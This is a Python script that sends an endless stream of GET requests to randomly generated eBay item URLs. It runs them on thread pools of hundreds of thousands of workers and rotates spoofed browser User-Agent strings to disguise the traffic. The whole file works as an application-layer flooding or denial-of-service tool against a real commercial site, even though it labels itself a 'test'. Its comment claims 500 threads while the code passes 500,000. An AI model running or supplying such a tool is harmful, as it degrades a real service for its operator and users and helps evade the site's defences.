import requests
import random
import time
from concurrent.futures import ThreadPoolExecutor

# Expanded list of random User-Agent strings
user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 8.0.0; SM-G950F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.98 Mobile Safari/537.36",
    "Mozilla/5.0 (iPad; CPU OS 13_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.3 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.1 Safari/605.1.15",
    "Mozilla/5.0 (Linux; Android 10; SM-G975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Mobile Safari/537.36"
]

def generate_random_url(base_url):
    # Generate a random 12-digit number
    random_digits = ''.join([str(random.randint(0, 9)) for _ in range(12)])
    # Replace the last 12 characters of the base URL
    return base_url[:-12] + random_digits

def send_request(base_url):
    random_url = generate_random_url(base_url)
    headers = {
        "User-Agent": random.choice(user_agents)
    }
    try:
        response = requests.get(random_url, headers=headers)
        print(f"Request to {random_url} - Status Code: {response.status_code}")
    except requests.exceptions.RequestException as e:
        print(f"Request failed: {e}")

def perform_requests(base_url, num_threads=100000):
    with ThreadPoolExecutor(max_workers=num_threads) as executor:
        while True:
            executor.submit(send_request, base_url)

if __name__ == "__main__":
    base_urls = [
        "https://www.ebay.com/itm/305669110440",
        "https://www.ebay.com/itm/305669110441",
        "https://www.ebay.com/itm/305669110430"
    ]

    for base_url in base_urls:
        print(f"Starting test with base URL: {base_url}")
        perform_requests(base_url, num_threads=500000)  # Use 500 threads per base URL
        print("\n")
